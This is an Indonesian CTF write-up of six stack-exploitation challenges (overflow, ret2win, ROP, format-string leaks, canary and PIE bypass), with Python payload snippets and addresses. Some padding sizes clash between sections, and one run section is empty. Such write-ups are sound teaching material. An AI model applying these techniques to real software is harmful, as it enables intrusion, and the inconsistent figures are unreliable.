## Soal 1 — Buffer Overflow: String Overwrite

**File exploit:** `exploit1.py`  
**Binary:** `./1` (PIE enabled, no canary)

### Konsep

Program membaca input ke buffer lalu membandingkan variabel lokal dengan string tertentu. Karena tidak ada batas panjang input, kita bisa overflow buffer dan menimpa variabel tersebut langsung di stack.

### Analisis

```
[  buffer (130 bytes)  ][  target_string (13 bytes)  ]
```

- Buffer berukuran 130 byte.
- Variabel target yang harus disamakan dengan `"labiovelarise"` berada tepat setelah buffer di stack.
- Tidak perlu tahu alamat apa pun karena kita tidak melompat ke fungsi lain — cukup timpa nilainya.

### Payload

```python
padding = b'A' * 130        # penuh-kan buffer
target_string = b'labiovelarise'
payload = padding + target_string
```


## Soal 2 — Buffer Overflow: Ret2Win

**File exploit:** `exploit2.py`  
**Binary:** `./2` (No PIE, no canary)

### Konsep

Program memanggil `gets()` yang tidak membatasi panjang input sehingga bisa digunakan untuk menimpa *return address* di stack dan mengalihkan eksekusi ke fungsi `win()`.

### Analisis

```
[  buffer (160 bytes)  ][  saved RBP (8 bytes)  ][  return address  ]
```

- Total padding = 160 + 8 = **168 byte** sebelum return address.
- Karena PIE **tidak aktif**, alamat `win()` bersifat statis: `0x401341`.

### Payload

```python
padding  = b'A' * 168
addr_win = 0x401341
payload  = padding + p64(addr_win)
```

## Soal 3 — ROP Chain: `pop rdi; ret`

**File exploit:** `exploit3.py`  
**Binary:** `./3` (No PIE, no canary)

### Konsep

Fungsi `win()` memerlukan argumen tertentu (register `rdi`). Karena NX aktif, kita tidak bisa menjalankan shellcode langsung — sebagai gantinya digunakan *ROP gadget* `pop rdi; ret` untuk mengontrol nilai `rdi` sebelum melompat ke `win()`.

### Analisis

```
[  buffer (152 bytes)  ][  saved RBP (8 bytes)  ][  gadget: pop rdi ][ nilai rdi ][ addr win ]
```

- Gadget `pop rdi; ret` ditemukan di alamat `0x40141f`.
- Alamat `win()` statis: `0x401421`.
- Nilai argumen yang benar dicari secara brute-force dari `-5` sampai `10`.

### Payload

```python
padding = b'A' * 152
payload = padding + p64(pop_rdi) + p64(arg_v) + p64(addr_win)
```

### Cara Jalankan

```bash
# Lokal
python3 exploit3.py

# Remote
python3 exploit3.py REMOTE
```

## Soal 4 — Format String: Stack Leak

**File exploit:** `exploit4.py`  
**Binary:** `./4` (No PIE, no canary)

### Konsep

Program menggunakan `printf()` dengan input pengguna sebagai *format string* secara langsung. Ini memungkinkan pembacaan isi stack menggunakan specifier `%N$p` (cetak pointer di posisi ke-N dari stack).

### Analisis

Flag disimpan sebagai string di stack. Dengan mengirim `%52$p.%53$p...%58$p`, kita membocorkan 7 nilai pointer sekaligus. Nilai-nilai tersebut diinterpretasikan sebagai little-endian bytes lalu dikonversi ke ASCII untuk merekonstruksi string flag.

### Payload

```python
offsets = [f"%{i}$p" for i in range(52, 59)]
payload = ".".join(offsets).encode()
```

Hasil decode (little-endian per blok 8 byte):

```python
raw_bytes = bytes.fromhex(hex_str)
flag += raw_bytes[::-1].decode(errors='ignore')
```

### Cara Jalankan

```bash
# Lokal
python3 exploit4.py

# Remote
python3 exploit4.py REMOTE
```

## Soal 5 — Stack Canary Bypass via Format String

**File exploit:** `exploit5.py`  
**Binary:** `./5` (No PIE, **canary enabled**)

### Konsep

Stack canary adalah nilai acak yang ditempatkan antara buffer dan return address. Jika canary berubah saat return, program akan crash. Namun, karena ada kerentanan format string **terpisah** dari buffer overflow, kita bisa membocorkan nilai canary lebih dulu, lalu menyertakannya kembali di payload BoF.

### Analisis — 2 Fase

**Fase 1: Leak Canary**

```python
payload_leak = b"%11$p.%12$p.%13$p.%14$p.%15$p"
```

Canary memiliki ciri khas: nilai 64-bit (16 karakter hex) yang **selalu berakhiran `00`** (null byte). Cari blok yang cocok di output.

**Fase 2: Buffer Overflow dengan Canary**

```
[  buffer (72 bytes)  ][  canary (8 bytes)  ][  saved RBP (8 bytes)  ][  addr win  ]
```

```python
padding_buffer = b'A' * 72
saved_rbp      = b'B' * 8
payload_bof    = padding_buffer + p64(canary) + saved_rbp + p64(addr_win)
```

- Alamat `win()` statis: `0x401371`.

### Cara Jalankan

```bash
# Lokal
python3 exploit5.py

# Remote
python3 exploit5.py REMOTE
```

## Soal 6 — Full Bypass: PIE + Stack Canary

**File exploit:** `exploit6.py`  
**Binary:** `./6` (PIE enabled, **canary enabled**)

### Konsep

Ini adalah tantangan tersulit karena menggabungkan dua proteksi sekaligus:

1. **PIE (Position Independent Executable)** → alamat fungsi tidak statis; berubah setiap kali dijalankan.
2. **Stack Canary** → return address dilindungi oleh canary acak.

Solusinya adalah **3-fase**: bocorkan alamat runtime `vuln()`, hitung offset ke `win()`, lalu bocorkan canary, baru kirim payload BoF.

### Analisis — 3 Fase

**Fase 1: Leak Alamat `vuln()` (bypass PIE)**

Program sendiri mencetak alamat runtime `vuln()` di output (`"Oops: <hex>"`). Karena offset antar-fungsi di ELF konstan (tidak peduli ASLR/PIE), kita hitung:

```python
addr_win_real = addr_vuln_real - 0x16   # offset: vuln - win = 0x16
```

**Fase 2: Leak Stack Canary via Format String**

```python
payload_leak = b"%25$p.%26$p.%27$p.%28$p.%29$p"
```

Cari blok 16-karakter hex yang berakhiran `00`.

**Fase 3: Buffer Overflow**

```
[  buffer (168 bytes)  ][  canary (8 bytes)  ][  saved RBP (8 bytes)  ][  addr win (dinamis)  ]
```

```python
padding_buffer = b'A' * 168
saved_rbp      = b'B' * 8
payload_bof    = padding_buffer + p64(canary) + saved_rbp + p64(addr_win_real)
```

### Cara Jalankan

```bash

# Remote
```

## 🔬 Analisis Tantangan & Writeup Singkat

### Soal 1: 1 - Zamuza
* **Analisis:** Menggunakan fungsi input yang tidak aman untuk membanjiri variabel lokal berdampingan di dalam stack memori guna memenuhi kondisi percabangan `if`.
* **Solusi:** Memasukkan padding sampah berukuran 160 byte diikuti kata kunci rahasia target (`labiovelarise`).

### Soal 2: 2 - Yoru Ni Kakeru
* **Analisis:** Menggunakan fungsi `gets()` tanpa batas input pada fungsi `vuln()`. Tidak ada proteksi *Stack Canary* maupun *PIE*.
* **Solusi:** Melakukan *Buffer Overflow* mentah dengan padding **168 byte** (160 byte buffer + 8 byte Saved RBP) lalu menimpa alamat RIP secara statis menuju fungsi `win()` pada alamat `0x401341`.

### Soal 3: 3 - Phony
* **Analisis:** Fungsi `win(int a1)` membutuhkan argumen spesifik pada register `RDI` agar dapat membaca file flag yang valid di server (`&fmt[16 * a1]`).
* **Solusi:** Memanfaatkan gadget `pop rdi; ret` pada alamat `0x40141f` untuk mengisi register `RDI` dengan nilai `3` melalui ROP Chain, diikuti dengan alamat kembalian menuju fungsi `win()`. Padding total: 248 byte.

### Soal 4: 4 - Freak Out Hr.
* **Analisis:** Celah *Format String* (`printf(s)`) yang digunakan untuk membaca memori stack lokal, karena flag asli telah disalin ke variabel `dest` di atas stack.
* **Solusi:** Melakukan kebocoran memori menggunakan penentu format `%p` secara berantai pada offset area atas (Offset 52-58) dan menerjemahkan representasi byte *Little-Endian Hex* kembali menjadi string ASCII murni.

### Soal 5: 5 - Loser Girl
* **Analisis:** Program mengaktifkan proteksi *Stack Canary*. Input pertama menggunakan `printf(s)` yang rentan celah format string, dilanjutkan input kedua `gets(s)` untuk mitigasi overflow.
* **Solusi:** Menggunakan input pertama `%15$p` untuk mencuri nilai acak *Stack Canary* di memori RAM server (mendeteksi pola hex berakhiran `00`). Pada input kedua, menyisipkan nilai Canary asli tersebut tepat di atas buffer 72 byte agar pemeriksaan keamanan program tidak *crash*, kemudian menimpa RIP menuju fungsi `win()`.

### Soal 6: 6 - Goodbye Sengen
* **Analisis:** Boss tantangan utama dengan proteksi ganda aktif: *PIE (Position Independent Executable)* dan *Stack Canary*. Alamat dasar program selalu diacak secara dinamis di dalam RAM.
* **Solusi:** 1. Membaca bocoran alamat riil `vuln()` yang dicetak cuma-cuma oleh program, kemudian menghitung posisi instan fungsi `win()` secara dinamis di memori (`addr_win = addr_vuln - 0x16`).
  2. Melakukan leak *Stack Canary* pada Offset 27 menggunakan celah format string biner.
  3. Membanjiri fungsi `gets()` dengan payload gabungan: 168 byte padding + Canary asli + 8 byte Saved RBP + alamat dinamis `win()`.
